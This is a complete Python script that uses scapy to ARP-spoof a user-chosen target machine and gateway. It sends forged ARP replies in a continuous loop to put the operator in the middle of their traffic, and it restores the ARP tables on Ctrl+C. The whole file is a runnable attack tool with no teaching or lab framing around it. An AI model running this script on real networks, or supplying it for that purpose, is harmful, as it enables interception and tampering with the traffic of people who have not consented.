from scapy.all import ARP, Ether, sendp, getmacbyip
import time
import sys
import socket


def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    local_ip = None
    try:
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        print(f"Local ip: {local_ip}")
        return local_ip

    except socket.error as se:
        print(f"Socket error: {se}")
    except Exception as e:
        print(f"Error when fetching local IP address: {e}")


def get_mac_from_ip(ip: str):
    mac = getmacbyip(ip)
    return mac


def spoof(victim_ip: str, victim_mac: str, spoof_ip: str):
    try:
        arp_response = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
        mac_ether = Ether(dst=victim_mac)
        fake_packet = mac_ether / arp_response

        sendp(fake_packet, verbose=False)
    except Warning as w:
        print(f"spoof: {w}")
        exit(1)
    except Exception as e:
        print(f"spoof: {e}")
        exit(1)


def restore(victim_ip: str, victim_mac: str, real_ip: str, real_mac: str):
    try:
        arp_response = ARP(
            op=2, pdst=victim_ip, hwdst=victim_mac, psrc=real_ip, hwsrc=real_mac
        )
        mac_ether = Ether(dst=victim_mac)
        packet = mac_ether / arp_response

        for i in range(3):
            print(f"Restoring attempt ({i}):")
            sendp(packet, count=4, verbose=False)
            time.sleep(1)

        print(f"\nMachine {victim_ip} restored.")

    except Exception as e:
        print(f"restore: {e}")
        exit(1)


def main():
    print(f"{'-' * 80}")
    print("ARP SPOOFING")
    print(
        "Press CTRL + C to stop the program and restore both gate and victim to normal state."
    )
    print(f"{'-' * 80}")

    local_ip = get_local_ip()
    if local_ip is None:
        print("Fatal: cannot fetch local IP")
        exit(1)

    gate_ip = input(f"Gate IP address: ")
    target_ip = input(f"Target IP address: ")

    target_mac = get_mac_from_ip(target_ip)
    gate_mac = get_mac_from_ip(gate_ip)
    if target_mac is None or gate_mac is None:
        print("restore: cannot resolve victim or gate MAC address")
        exit(1)

    print("ARP spoofing executing...")
    print("Press CTRL+C to stop and restore victims.")

    try:
        while True:
            spoof(target_ip, target_mac, gate_ip)
            spoof(gate_ip, gate_mac, target_ip)

    except KeyboardInterrupt:
        print("\n")
        restore(target_ip, target_mac, gate_ip, gate_mac)
        restore(gate_ip, gate_mac, target_ip, target_mac)
        exit(0)


if __name__ == "__main__":
    main()
